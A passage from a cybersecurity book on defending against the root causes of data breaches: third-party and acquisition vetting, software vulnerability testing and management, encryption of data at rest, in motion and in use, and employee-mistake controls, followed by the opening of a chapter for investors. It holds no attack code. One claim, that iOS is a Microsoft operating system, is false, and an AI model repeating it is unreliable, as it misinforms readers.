corporate   procurement departments can be a big bottleneck with regard to getting  a relationship set up and paid. As such, startups can offer services for   305   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  free for a trial period upon having a corporate or personal credit card  placed on file, and upon completion of the trial period, the card starts  getting charged. A software engineer that provided their credit card could  deploy not only development and test services, but production services  without the procurement department having any visibility. Even worse, the  information security team may not have any visibility! Although startups   as well as larger companies  allowing employees to easily sign up can  be great for speed and agility in the short term, it could often lead to both  procurement and security challenges down the line.  Once a list of supplier relationships is obtained, the list of suppliers  should probably be ranked by risk to determine which suppliers may be  in need of follow-up or first-time vetting. The following are some typical  questions to consider about each of the suppliers in ranking such risk:     What is the nature of the relationship?     What data are being exchanged or provided? How   sensitive is the data? Is personally identifiable  information provided to the supplier?  If the supplier  gets breached, does it mean that we are immediately  breached?  Are any intellectual property, customer  data, or trade secrets provided?     What access to resources at our organization is the  supplier provided with? Network access? Account  access? Credentials of any sort  certificates, etc. ? APIs?  Depending upon the answers to the preceding questions, the following   are some questions that should be considered for high-risk suppliers:     How is any data that they are provided with stored and   encrypted?     How is the data protected at rest and in transit?  306   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two     What connection or interconnection, if any, is being   made between the two organizations?     How are network segments that store sensitive data   segregated from the rest of the supplier’s network?  It is typically a good idea to understand the security posture of high-  risk suppliers. One way to do that is to audit them. However, conducting  an audit is an expensive proposition that takes time. In addition, if every  company has to audit every company that it uses as a supplier, it would  result in an “order n-squared” number of audits that have to take place,  in computer science parlance. As such, if a supplier has already had an  audit completed recently  e.g., in the past year , it would probably be more  efficient to get access to the supplier’s audit results than to audit them from  scratch. As such, it may be a good idea to understand what information  security and privacy audits have been conducted at the supplier, and  request access to their relevant audit results, including, for instance, their  PCI AOC  attestation of compliance , SOC2  systems and organizational  controls  audit results, ATO certificate, and so on.  To get a sense of what a supplier’s external security posture might be  without any audit results, one can use services such as SecurityScorecard  or BitSight. These services scan a company’s external security posture for  hundreds, thousands, or more externally observable factors that may be  indicative of how a company manages its security.  Note that these services do not conduct penetration tests, which   typically need to be explicitly authorized by the supplier by law.  If the supplier has never had an audit, you also do not have to start  doing one yourself from scratch. You could, for instance, use Google’s  open source Vendor Assessment Security Questionnaire1 or use   1 A demo is available at https:  vsaq-demo.withgoogle.com , and   you can modify it as per your needs leveraging the open source code at   https:  opensource.google projects vsaq.  307   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  many of the freely available vendor security questionnaire templates.   SecurityScorecard and BitSight both offer such templates as well.   You can also look up the external security posture of your own   organization and see how the posture of your suppliers compares to your own.  Even if an existing or new third party isn’t up to snuff with their   security, but the business needs their product or service, you can decide if  they are meeting the minimum bar for your supplier relationships from a  security perspective. If they are, renew or sign the agreement with them. If  not, tell them what improvements need to be made before you can renew  or sign an agreement with them. The goal is to contractually put them on a  road map to improve their security to hit and exceed the minimum bar that  you require. Following up with them regularly  e.g., annually  to track their  improvements is a good idea, or more often as needed if there are critical  aspects of their security posture that need immediate improvement.   Acquisitions If there is a third-party company that your organization is considering  acquiring, that company needs to be vetted in much more detail than  a typical supplier well before the acquisition. Once the acquisition  completes, that third-party company becomes first party, and if they get  breached, your organization is breached with it. Note also that upon an  announcement of an acquisition, there will be quite a bit of attention that  both companies can get.  Such was the case with Marriott’s acquisition of Starwood, as covered  in Chapter 3. It was unknown to Starwood and to the world that Starwood  got breached four years prior to Marriott’s acquisition of it. Once Marriott  acquired Starwood, and the breach was discovered, it was all of Marriott  that was considered breached, and Marriott was held accountable for large  fines of over $100 million.  A fairly small, private acquiree may get much, much more attention   than they are used to if they are getting acquired by a large, public   308   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  company, and such attention is likely not to be just from the press and the  financial markets, but from attackers also!  A CISO should be made aware of any potential acquisition ideally well  before the business terms of the acquisition are agreed upon, and certainly  well before the acquisition closes. The CISO should be given the opportunity  to vet the potential acquisition from a security perspective, either using their  own internal team or leveraging a third-party security consulting firm to  help vet the acquisition. Should the potential acquiree be highly vulnerable,  attackers can leverage such vulnerabilities the day the acquisition is  announced, and throw a wrench in the works—instead of telling the story of  what a wonderful acquisition was just made, and why both the acquirer and  acquiree are more valuable together, a breach will have the acquirer reacting  to explain to the market what just happened. For the acquiree, a breach  could materially devalue the company. In the case of the Yahoo breach  announced in 2016 while it was in the process of getting acquired by Verizon,  the original $4.83 billion acquisition price was lowered by $350 million.  The acquirer should conduct a full security audit of a potential   acquiree. Such a security audit can include not only a review of previous  audits that have been done but also include a fresh, new, more detailed  audit conducted by auditors paid by the acquirer.  Past audits were likely  paid for by the acquiree.   It is also often a best practice to conduct a holistic penetration test   of the potential acquiree. The penetration test can reveal potential  vulnerabilities that attackers would be able to exploit that should perhaps  be remediated prior to the acquisition. Just as important, but perhaps not  as customary, would be to have the acquirer conduct a “hunting” exercise  on the acquiree to determine whether or not the acquiree may have  already been breached. Such an exercise would involve scouring through  all internal systems at the acquiree looking for indicators of compromise   IOCs , indicators of attack  IOAs , and any other signs  e.g., encrypted  RAR files  that a breach may have already occurred.  309   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  If the acquiring company is a regulated business  such as a bank, or  a company that is under a Federal Trade Commission order , regulators  expect that the acquiree will be brought up to the same security standards  that the acquirer practices within a reasonable amount of time. A detailed  security audit conducted by the acquirer can reveal how much work may  be required and how much time might be needed to bring the potential  acquiree up to the security standards of the acquirer.   Developers, Partners, and Customers Suppliers and potential acquirees are not the only type of third parties  that come with security risk. One of Solomon’s well-known proverbs  is “You are the company you keep.” So is the case for organizations as  well. In 2019, Facebook suffered a $5 billion fine imposed by the Federal  Trade Commission because one of its third-party developers, Cambridge  Analytica, abused their service, stored profile data of tens of millions of  users against Facebook’s terms of service, and used the data to advertise  to US voters. If you allow third-party developers or business partners to  access data about your consumers or customers, vetting and monitoring of  the activities of those third parties is advisable.  Although it is most often the case and is relatively well understood that  security practices of suppliers who are given sensitive data must be vetted,  the same is true for customers as well. If your organization, for instance,  sells data to your customers, and a customer were to be breached, a breach  can be attributed to your organization. One example of such a breach was  the Dun & Bradstreet breach. Dun & Bradstreet  D&B  was in the business  of aggregating data about employees in corporations—their names, titles,  email addresses, phone numbers, and so on. They also regularly sold that  data to many of its customers, who had interests in using that data for lead  generation or other sales activities. In 2017, one of D&B’s customers was  breached, and a database of over 33 million such data records that was  sold to them was exfiltrated. D&B may not have even known which of its   310   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  customers had gotten breached, but from the data stolen, it was clear that  the data was originally purchased from D&B. Even though it was one of  D&B’s customers that was breached, the breach was attributed to D&B in  the press and media. If your organization sells data to customers, it may  be just as important to vet the security of the customer before providing  them with the data, as if they get breached, your organization can be held  accountable for the breach.  In this section, we have discussed a variety of third parties and the   security risks that they can pose, as well as how to take steps toward vetting  them and reducing the likelihood that your organization can be breached  as a result of third-party relationships.   Identifying Software Vulnerabilities Software engineering is inherently hard, and often requires creativity,  impeccable logic, and typically involves intense complexity. Software  engineering is also a relatively new field, certainly less than 100 years  old, as compared to, for instance, building construction. “Building  codes” for safe and secure software engineering have not been adopted  by most governments, and no license is required to develop software  that the public relies on to support power grids, electronic commerce,  or communications systems, among many other areas that could be  considered to be critical infrastructure. Some government regulations  exist, such as FISMA, the Federal Information Security Management  Act from 2002, and the more recent Federal Information Security  Modernization Act of 2014. Also, although some companies that develop  software subject themselves to compliance standards similar to NIST  800-53, there is typically no regulatory requirement to do so  e.g., unless a  company has been singled out in a Federal Trade Commission action .  311   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  Companies that develop or use software need to be very aware of the  fact that all software has vulnerabilities. Some of these vulnerabilities are  due to bugs, whereas other vulnerabilities are due to design flaws.2 All  software has bugs and some bugs are security vulnerabilities.  For organizations that develop software of their own, their software  is susceptible to what can be called first-party software vulnerabilities— vulnerabilities in their own code that can be exploited by attackers to  conduct data breaches or worse. Facebook’s “View Page as…” data breach  in which three software vulnerabilities came together in a manner that an  attacker exploited them and stole profile data of 50 million users was an  example of a first-party software vulnerability.  For organizations that use software developed by others  third parties ,  which accounts for an overwhelming majority of organizations today, there  is a deep need to be sensitive to third-party software vulnerabilities. Such  vulnerabilities can be identified by the organization that produced the  software or by security researchers at some point after the software’s release  and use. In the remainder of this section, we describe how to mitigate the  risks both due to first party and third-party software vulnerabilities.   First-Party Vulnerabilities In this section, we focus on discussing technologies that can be used  to find and fix first-party software vulnerabilities. There are many  technologies that can be used to identify first-party vulnerabilities; many  of which have their own acronyms. The software security space is, in fact,  littered with dozens of acronyms. We cover just a few of them here.  We break our discussion of addressing first-party security   vulnerabilities into three parts based on whether or not a particular  technology is typically used to find first-party security vulnerabilities   2 Gary McGraw, Software Security: Building Security In  Addison-Wesley, 2006 .  312   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  during the  1  development,  2  testing, or  3  production deployment  phase of a software engineering project. Table 13-1 shows the techniques  we describe in this section based on the software project phase.  Table 13-1.  Techniques to Identify First-Party Software  Vulnerabilities  Development  Testing  Production  static application security  testing  sast  software composition  analysis  sCa  Manual code reviews   MCr   Dynamic application  security testing  Dast  interactive application  security testing  iast  penetration testing  runtime application self-  protection  rasp  Bug bounty programs penetration testing   Development  During development, the best thing that one can do to proactively identify  security design vulnerabilities is to conduct a security design review. Such  a review is typically done by a security architect by reading over software  design and architecture documents, ideally before even a single line of  source code is written. Defects in design are typically identified during  such a review and can save tons of cost as well as much heartache, as  compared to fixing defects after the software has already been released.  To help design security into software, the IEEE Center for Secure Design   CSD 3 provides “building codes” for multiple verticals such as the Internet  of Things, Power Systems, and Medical Device Software. In addition to  building codes, the IEEE CSD also provides guidance such as “Avoiding the  Top 10 Software Security Design Flaws.”  3 IEEE CSD Home Page, https:  cybersecurity.ieee.org center-for-  secure-design   313   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  Once source code has been developed, static analysis, also called static  application security testing  SAST , can find vulnerabilities in source code  without actually running the code. Many types of software vulnerabilities,  including many traditional buffer overflows, code injection, and cross-site  scripting vulnerabilities, can be identified through SAST. Static analysis  tests have the characteristic that specific lines of code that have the  vulnerability can be identified.  In addition to SAST, software composition analysis  SCA  can take   place during the development phase to identify the usage of third-party  components in first-party written code that could potentially have security  vulnerabilities. Although we devote the next section specifically to  discussing third-party software vulnerabilities, the types of vulnerabilities  identified by SCA are due to usage of third-party, open source software  libraries, as opposed to fully packaged, sold, and independently running  third-party software systems upon which an organization might rely. Finally, manual code reviews can be done by internal or external   developers to identify vulnerabilities. Code that conducts security-  sensitive functions or uses cryptography is code that can typically benefit  from manual source code reviews. Even though such reviews are expensive  in time and cost, there can sometimes be no way to identify subtle  vulnerabilities except via inspection by an expert code reviewer.  Once a program or system has been written by a software developer, it can  be tested, either on its own  as part of a unit test  or together with a larger  system in which it functions  as part of an integration or regression test .  Dynamic and interactive security testing can be used to find vulnerabilities  in the testing phase of the engineering of software.  Dynamic analysis, also called dynamic application security testing    DAST , is focused on attempting to find vulnerabilities by trying  automated sets of tests against the running source code. Such analysis    Testing  314   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  is “black-box” because the testing involves sending inputs into running  programs and observing outputs but does not involve looking at the source  code itself. Testing that looks at the source code itself, as occurs with  SAST, is by comparison called “white-box” testing, in which one assumes  that the tester has access to the source code of a system to try to find  vulnerabilities.  Interactive application security testing  IAST  is similar to DAST  in that the source code is run, but instead of trying a prepackaged set  of automated tests, a combination of both human and automated  tests is employed to try to find vulnerabilities. IAST is also “white-box”  and typically also involves instrumenting the code, such that when a  vulnerability is found, it is possible to identify which specific line or  lines of the source code have the vulnerability. By comparison, when a  vulnerability is found through a DAST test, it may be unclear as to which  line or lines of source code may need to be fixed. IAST, however, often  requires either instrumenting the code or installing agents. Finally, IAST  requires the organization to have a comprehensive set of automated   and or manual tests in order to provide good value, unlike DAST  which  comes with its own set of active tests .  Penetration testing can also take place during the testing phase of a   project. Penetration testing is usually carried out by highly skilled humans.  Penetration testers may use a variety of techniques, including DAST or  IAST, to attempt to find vulnerabilities on test sites. Ideally, penetration  tests can be conducted as necessary, and vulnerabilities can be found and  fixed prior to software being released into a production environment. Continuous integration and continuous deployment  CI CD  has   also been a practice that has taken the software world by storm to allow  for fast feature development, frequent code changes, and rollout to  production. CI CD is characterized by frequent, small code check-ins  to source code repositories, and heavy use of automation in deploying  code into new environments including testing, staging, and production.  CI CD requires continuous testing in order to work, including security   315   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  testing  assuming that one would like to achieve security in addition to fast  feature development . Constructing CI CD pipelines as well as continuous  security testing can be enabled by tools such as Opsera. Opsera, for  instance, allows developers to choose which development tools they  would like to use to construct their CI CD software development pipelines  in a “plug-and-play” fashion, including which security tools should  monitor for software security. In constructing their CI CD pipelines,  developers can choose which SAST, DAST, and container scanning tools to  use to monitor for vulnerabilities that can get introduced as new code gets  added into pipelines.   Production  Once a software project has been tested, and is released into a production  environment, runtime application self-protection  RASP  can be used to  identify attacks that might attempt to exploit as yet unfound vulnerabilities.  RASP technologies examine real input coming from users  or attackers   and can both monitor and block attacks conducted against production  environments.  Penetration testers can also, with permission, authorization, and   extreme care, attempt to identify vulnerabilities in production. However, it  is much preferred to conduct penetration tests against test environments,  as it can sometimes be unpredictable as to what might occur if a  penetration tester inadvertently or explicitly exploits a vulnerability in  production. Such exploitation could affect real user data  e.g., transfer  money from one user’s account to another  or result in downtime if the  vulnerability exploited is significant enough.  Penetration testers are often referred to as “red teams” and are   responsible for finding vulnerabilities that can be exploited. Red teams  are often said to conduct “offensive security.” However, they do conduct  “offensive” exercises simulating what real attackers might do, only with  authorization to do so. Hence, penetration testers are also sometimes   316   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  referred to as “ethical hackers.” “Blue teams” on the other hand are made  up of security professionals that are responsible for defensive security.  Traditionally, red teams may spend a focused time period: a day, a few   days, a week, or perhaps a month, just trying to break into systems. Then  they write a report on all the vulnerabilities they find and throw them over  the wall to the defenders. However, that may mean the vulnerabilities are  still live and exploitable for quite some time until the report is written,  the results are digested, and work to defend is prioritized, and so on.  Alternatively, red teams and blue teams can collaborate together in real  time as part of a combined “purple team” in which the blue team can  fix vulnerabilities almost immediately after they have been discovered,  whenever possible.  A special class of “red team” penetration testers that are often paid   per vulnerability that they find through “bug bounty” programs and they  can target production systems in their tests. Such penetration testers do  indeed need to exercise utmost care and are typically bound by terms and  conditions of the bug bounty program to not attempt to exploit potential  vulnerabilities should they believe there is any risk that it may pose to user  data or the uptime of the online service being tested.  Production environments also typically leverage many third-party   software tools, and one may need to take advantage of vulnerability  scanners to identify vulnerabilities in such third-party tools. As such,  in the next section of this chapter, we more broadly discuss third-party  vulnerabilities.   Third-Party Vulnerabilities In this section, we discuss how to manage third-party software  vulnerabilities and what key elements should be included in a vulnerability  management program.  317   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  Many businesses rely on software, more so than ever before. Marc  Andreessen, co-inventor of the NCSA Mosaic browser, co-founder of  Netscape Communications, and co-founder of Andreessen-Horowitz,  has said that “software is eating the world.” All software has bugs. Some of  those bugs result in security vulnerabilities. All those vulnerabilities need  to be identified. The critical and high severity ones need to be fixed or  contained in a very timely fashion such that they cannot be exploited, as  such vulnerabilities can give attackers the ability to remotely take control  of systems, often in such a way that can enable a data breach to occur.  Medium and sometimes low severity vulnerabilities need attention as well,  although may not warrant as much urgency or as much investment as  critical or high severity ones.   Identification and Validation  One key technology required to identify third-party software  vulnerabilities that is a necessary but not sufficient part of a vulnerability  management program is a vulnerability scanner. Rapid7’s Nexpose, Qualys  Cloud Platform, and Tenable’s Nessus are examples of vulnerability  scanners. Such scanners can probe the network to identify what machines  are running on the network and what software is running on those  machines. Scanners can enumerate every possible reachable IP address  or be provided a list of IP addresses to scan. The scanner attempts to  communicate with running software on every network port at those IP  addresses, getting the software to reveal information about itself through  its responses, behavior, and sometimes even from it announcing its version  number directly. Based on such responses, and an internal database that  the scanner has, it can identify vulnerabilities in software that is running  on the network.  Vulnerability scanners often identify dozens, hundreds, and   sometimes thousands of vulnerabilities even on a relatively small network.  But that is only where the story begins. The vulnerabilities have only been   318   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  identified. They have yet to be definitively fixed. If the next step that, say,  a security operations team does is to export that data into a spreadsheet, a  nightmare will usually result.  Each vulnerability has only been identified, and needs to be validated,   as sometimes a vulnerability scanner generates false positives. Once  validated, each such vulnerability needs to be tracked, for if just one  vulnerability is left open, that could be the hole that an attacker can use to  make an initial compromise. As defenders, security professionals are often  at an asymmetric disadvantage in that they may need to close or patch  every critical, high, and potentially medium severity vulnerability.  Even worse, the vulnerability scanner may have false negatives—  vulnerabilities that exist, but that are not detected by the scanner. The  security team may then be unaware that a particular vulnerability still  exists after a scan, as occurred at Equifax even after notifications are  sent out informing employees that Apache Struts servers needed to be  patched. And to make things even worse, different vulnerability scanners  can detect different vulnerabilities with the overlap being relatively  low4—one scanner’s true positive is another scanner’s false negative. If an  organization does not use more than one scanner concurrently, it is likely  to have a significant number of false negatives.   Prioritization  There are typically so many vulnerabilities in results of such scans from  a single vulnerability scanner that prioritization of which vulnerabilities  to fix first is absolutely critical. Are there vulnerabilities that attackers are  exploiting right now at other organizations? Are packaged-up scripts to  exploit the vulnerabilities immediately available on the dark web? What  does the National Vulnerability Database  NVD  say about how easy it is   4 Holm, Hannes & Sommestad, Teodor & Almroth, Jonas & Persson, Mats.  2011 . A  quantitative evaluation of vulnerability scanning. Inf. Manag. Comput. Security.  19. 10.1108 09685221111173058.  319   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  to exploit the vulnerability, even if a packaged-up script is not known to  be available on the dark web? Are there compensating controls in place,  such as a firewall or intrusion prevention system, that would prevent  the vulnerability from getting exploited even if it was not patched at the  source? Companies such as Kenna, Tenable, RedSeal, SecureWorks,  Skybox, and Recorded Future produce a variety of product offerings  that help organizations prioritize risk of their third-party vulnerabilities  by leveraging security and threat intelligence, asset and attack surface  understanding, and context of your organization’s network architecture,  among other approaches.  Once all the outstanding vulnerabilities are prioritized, one has to   determine what work is involved in developing a fix or patching the most  significant ones, testing the fix  including regression testing , and the  impact that rolling out changes will have on users and “downstream”  systems. Software has both the advantage that it is extremely malleable  and the disadvantage that it is extremely malleable. Although a  vulnerability can be fixed, managing the changes that the fix can have on  other systems or on users takes work in and of itself to estimate, develop,  test, deploy, and roll out. Each outstanding vulnerability may result in a  software project of its own to fix, especially if an organization has many  legacy systems.   Workflow Tracking and Verification  Tracking the workflow involved in managing vulnerabilities is also a  significant challenge. A particular type of vulnerability may exist on  multiple servers and needs to be addressed on each of those servers. Even  if addressing those vulnerabilities is divided up among IT staff, the first  such attempt at fixing the vulnerability may fail. The failure of the first  attempt will not be detected unless a rescan is done to ensure that the  vulnerability no longer exists. As such, dividing up vulnerabilities and  tracking them using a spreadsheet is highly likely to fail.  320   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  Most organizations attempt to use ticketing systems to track open   vulnerabilities. A ticketing system is a system that tracks open work that  needs to be assigned and done, and each item of work is tracked with a  ticket. A ticket in such a system is simply like a document that only gets  deleted or archived once the corresponding work item is completed. Given the number of vulnerabilities that may exist, it is typically a   losing proposition to have staff manually create vulnerability tickets, even  if a vulnerability scanner has the technical capability to import data into  tickets one machine or vulnerability at a time.  Ideally, tickets should not be closed unless it can be technically   verified through a rescan that a vulnerability no longer exists. If a technical  verification is not done prior to closing a vulnerability ticket, it is like  just forgetting the vulnerability exists just because someone attempted  to fix it. The “college try” does not mean that the problem is solved. As  so eloquently stated by Yoda, one must “Do or do not, there is no try.”  Vulnerability tickets must only be closed once it can be technically verified  that the job of fixing the vulnerability is successfully done.  Although vulnerability scanners do offer some integration with   ticketing systems such as ServiceNow, JIRA, and so on, large organizations  often need to automate vulnerability ticket creation and workflow  management themselves. To help, Aegis  https:  github.com  nortonlifelock aegis  is an open source project that helps do so in  a much more scalable fashion that trying to manage vulnerabilities via  spreadsheets.   Endpoint Patching  One important class of vulnerabilities that also needs to be managed is  vulnerabilities on endpoints. Operating system vendors such as Microsoft  and Apple often identify vulnerabilities in their software, as do application  software vendors.  321   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  Patches to fix such vulnerabilities can be rolled out regularly.   Microsoft, for instance, rolls out patches on the second and sometimes the  fourth Tuesday every month. A regular patching cadence is very valuable  as it ensures that vulnerabilities on endpoints get regularly addressed and  the amount of time that an endpoint is unpatched and vulnerable is not  unbounded. The Google Chrome browser takes the additional step of   self- updating and self-patching as soon as patches become available. The more endpoints than an organization has, the more diverse  will be the configurations and set of software on endpoints that need  to be patched. As such, various IT and security vendors provide patch  management platforms to help CISOs and CIOs get visibility, roll out  patches, and manage the patch state of the fleet of endpoints in use at an  organization.   Unencrypted Data Data can be either at rest  stored on a device , in motion  transmitted  over a network , or in use  in memory . The confidentiality of data that is  sensitive in some nature  e.g., PII  needs to be protected when it is in any  of these states. In this section, we discuss various technologies that can  protect the confidentiality of data when it is in any of these states.  Note that there are many encryption algorithms that can be used to  protect data  e.g., Advanced Encryption Standard is one , but we do not  describe the plethora of algorithms or options here. Rather, we refer the  reader to Neil’s book on Foundations of Security  Apress, 2007 , Bruce  Schneier’s Applied Cryptography, 20th anniversary ed.  Wiley, 2015 ,   and Dan Boneh and Victor Shoup’s “A Graduate Course in Cryptography”   https:  cryptobook.us  .  322    teChnology Defenses to fight the root Causes of BreaCh: part two  Chapter 13   Data at Rest In many incidents in which laptops, mobile phones, or hard drives are lost  or stolen, such incidents become data breaches when “data at rest” on  the devices is not encrypted. Encryption of sensitive data can be done at  many levels, and in this section, we will consider storage-level encryption  and application-level encryption. Storage-level encryption can be done  by the operating system or a hard drive itself in which ideally all data on  the disk is encrypted with an encryption key derived from a password  that is not stored in the clear on the device. Modern operating systems  typically offer some form of storage-level encryption—Microsoft Windows  offers BitLocker and Apple Mac OS offers FileVault. Mobile operating  systems such as Google’s Android and Microsoft’s iOS offer storage-level  encryption as well. Enabling storage-level encryption avoids lost or stolen  device incidents from becoming data breaches.  When encryption is used as a tool to protect the confidentiality of data,   where the encryption keys are stored and who has access to them is of  central importance. If a large amount of data must be kept confidential,  then by encrypting the data, the scope of achieving confidentiality is  reduced from keeping all of the data confidential to keeping just the  decryption key confidential. Storage-level encryption protects against  malicious insider technicians in a data center stealing disks. Although  the technician can get access to the encrypted data on a hard drive, they  presumably cannot get access to the decryption key, which is typically  derived from an operating system–level password provided at system  boot time. Although such incidents can and do occur from time to time,  and as we have seen from the mega-breaches in the first part of this book,  most organizations are much more susceptible to databases getting stolen  remotely than disks getting stolen out of data centers.  323   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  Application-level encryption is a form of encryption in which   software applications use cryptographic libraries to encrypt data using a  key known to the application, as supplied by the user of an application.  When an attacker breaks into a system remotely, they may have the  privileges of some user on the machine and would be able to decrypt  any data accessible to that user that may be protected with storage-level  encryption. However, consider an attacker that only has access to a low  privilege account  e.g., a guest account , and not a user account for an  application that processes credit card applications. In such a case, there  is hope that an initial remote compromise may not lead to a breach of all  credit card applications stored by the system. In particular, if the credit  card application database is encrypted at the application level using an  encryption key that is only known to the user of the credit processing  application, irrespective of which operating system–level account is  running the application, the confidentiality of the data can still be  maintained. On the other hand, if the attacker gets access to a root or  administrative access account, all bets may be off. An attacker that has root  credentials can wait until the credit processing application is run, and then  can use root access to peer into the memory of that running application.  To defend the confidentiality of data even when an attacker has root  privileges, see the upcoming subsection on “data in use.”   Data in Motion When data are being transmitted from one machine to another machine  over a network, its confidentiality may need to be protected from prying  eyes or eavesdroppers while it is in transit. Such protection is usually  accomplished by agreeing upon a shared encryption key at both ends  of the communication. The data is encrypted prior to transmission over  the network and then decrypted upon receipt after the transmission is  received. There are many protocols that can be used to secure data in  motion, but we note that Transport Layer Security  TLS  is used by almost   324   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  all web browsers and web servers as the de facto standard for protecting  the confidentiality of data in motion.  TLS also incidentally guarantees  the integrity of messages transmitted and typically provides server  authentication.  After a network connection is set up, TLS uses public-key  cryptography to agree upon a shared key. The shared key is used by each  party to encrypt communications before data are sent to the other side,  and communication arriving from the other party is decrypted. We refer  the reader to Chapter 15 in Foundations of Security  Apress, 2007  , as well  as the many other available references on TLS for more information on  TLS protecting data in motion.   Data in Use Now that we have covered protecting data at rest, and data in motion  albeit  briefly , the only remaining point at which sensitive data may need to be  protected is when it is in use. How can we protect the confidentiality of such  data even if the attacker has obtained root privileges and nearly full access to  the machine’s memory? The solution lies in not decrypting sensitive data in  general purpose memory. Rather, encrypted data is only processed in a secure  enclave, a technology enabled by hardware support at the microprocessor  layer by ARM’s TrustZone, AMD’s Secure Encrypted Virtualization  SEV , and  Intel’s Trusted Execution Technology  TXT  and Software Guard Extensions   SGX . A secure enclave is made up of a Trusted Execution Environment   TEE  that has its own dedicated CPU and memory. The memory in the TEE  and the registers in the CPU that are used to process data are encrypted with  keys that are inaccessible outside of the secure enclave.  Secure enclaves are used in Apple iPhones to store and process data  such as fingerprints used by TouchID as well as cryptographic keys, and  Google is using AMD’s SEV to secure data on its cloud servers. Secure  enclaves can also now be used by almost any organization to protect the  confidentiality of data in use and protect even against attackers that may  compromise an environment and achieve root access.  325   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two   Inadvertent Employee Mistakes The final root cause of breaches that we discuss is inadvertent employee  mistakes. Getting phished is an example of an employee mistake that can  result in a breach, and there are many other such examples. Many of the  technologies that we discussed in this chapter until this point can help with  a variety of specific inadvertent employee mistakes. For instance, static  analysis technologies can help fix an engineer’s buffer overflow vulnerability  before it gets checked into an organization’s source code repository.  Security awareness training for all of your employees, contractors, and  partners can be an import part of your set of countermeasures to deal with  the catchall of other possible inadvertent employee mistakes. Security  awareness training increases employee engagement and sharpens their  abilities to detect, identify, and avoid falling into traps that can come up  that perhaps are unanticipated. A number of vendors make such training  entertaining and provide simulations that require an employee to think  through risk trade-offs. Aside from anti-phishing training, which we  covered in an earlier section, there are many types of social engineering to  which employees can fall prey, and security awareness training can help  employees become less susceptible to social engineering in general. Data loss prevention  DLP  tools are another example of systems   that attempt to protect against inadvertent employee mistakes that may  result in leakage of sensitive data to unauthorized parties. DLP systems  detect when sensitive information may be leaving an organization and  ideally block such sensitive information from leaving. For example, a DLP  system can help block an email with a spreadsheet attachment containing  a list of all employees, their SSNs, and salaries that an HR employee may  inadvertently send to the wrong recipient. If the recipient is external to  the organization, as can sometimes occur if the employee mistypes the  recipients email address, the organization will have a reportable data  breach to deal with if the email is actually sent. A DLP system that scans  employee emails before they are sent can prevent such a breach.  326   Chapter 13    teChnology Defenses to fight the root Causes of BreaCh: part two  Security awareness training and data loss prevention tools are two   additional tools, complementary to the many defenses discussed earlier in this  chapter, that can be used to defend against inadvertent employee mistakes.   Tactical Approach and Tool Selection For each of the root causes of data breaches, we encourage security leaders  to write down their approach to addressing each root cause of breach, and  what security tools they select to help them implement their approach.  Table 13-2 is such an example, and given the knowledge in this chapter, we  encourage leaders to codify their approach and the tools they currently or  plan to employ to mitigate the root causes of breach.

Third-party risks due to suppliers, partners, developers, potential   acquisitions, and customers have been responsible for many breaches.  A third-party management program can assess the risks due to various  types of third parties, vet and audit them both during creation of a  new relationship and regularly thereafter for high-risk third parties,  and leverage tools that automatically monitor the security posture of  third parties. First-party and third-party software vulnerabilities can  be identified using a combination of automated static and dynamic  analysis during development or by penetration testing. Unencrypted data  at rest, in motion, and in use can be addressed by leveraging storage-  and application-level encryption, TLS or similar protocols, and secure  enclaves, respectively. Finally, security awareness training and data  loss prevention are examples of tools that can help address inadvertent  employee mistakes beyond phishing.  With the dozens of technologies discussed in this chapter and the last,   leaders in organizations can mitigate the risk due to the root causes of  data breaches and outline their tactical approach and tool selection. With  knowledge of the root causes of breach and how to combat them, we will  have fewer organizations get breached in the future.  329   CHAPTER 14  Advice to Cybersecurity  Investors  Over $45 billion of private equity and public IPO  initial public offering   investment has been made in cybersecurity companies from 2003 to 2020,  yet the mega-breaches have continued. This chapter covers where all this  money has been going and what categories of defenses have been invested  in thus far. We then go on to analyze what areas of cybersecurity are ripe  for further investment. As an example, areas such as Internet of Things   IoT  security and privacy, among others, have received less investment as  compared to, say, network security and probably warrant more investment  going forward.   Data Sources Most of the raw data on cybersecurity companies used to draw the  conclusions in this chapter comes from Crunchbase. Crunchbase was  founded in 2007 to initially track startups featured in TechCrunch articles,  but has grown significantly over the years. The data in Crunchbase’s  database comes from over 4,000 venture firms, accelerators, and  incubators, in addition to data aggregated by an in-house data team and  members of the Crunchbase community. Machine learning algorithms  also scour the Web to add to the database.    Neil Daswani and Moudy Elbayadi 2021  N. Daswani and M. Elbayadi, Big Breaches, https:  doi.org 10.1007 978-1-4842-6655-7_14  331   Chapter 14    adviCe to CyberseCurity investors  The data from Crunchbase is not perfect, and I  Neil  fully expect that  neither is my analysis based on their data. That said, while every category  in the data set that is attributed to a security startup and every single figure  on how much money the startup raised may not be 100% correct, I believe  that the macro-trends that I derive from the data are highly likely to be  directionally correct, even if not 100% technically accurate. For instance, if  approximately $11 billion has been invested in network security over the  17-year period from 2003 to 2020, but less than $2 billion has been invested  in IoT security, it is more likely than not that more investment is needed in  IoT security, especially considering that billions of devices will be coming  online, and we’ve only begun to see IoT attacks such as the Mirai botnet  cripple some of the largest sites on the Internet, including Twitter, Netflix,  Spotify, and many others back in 2016.   Security Startup Revolution Since the commercialization of the Internet started in the mid-1990s,  it has been a revolutionary time for cybersecurity. Approximately 4400  cybersecurity companies have started from 2003 to 2020, but the breaches  continue on an all too frequent basis.  The number of cybersecurity companies that have been founded per  year skyrocketed from under 200 per year in 2010 and prior to over 400 in  2014, as per Figure 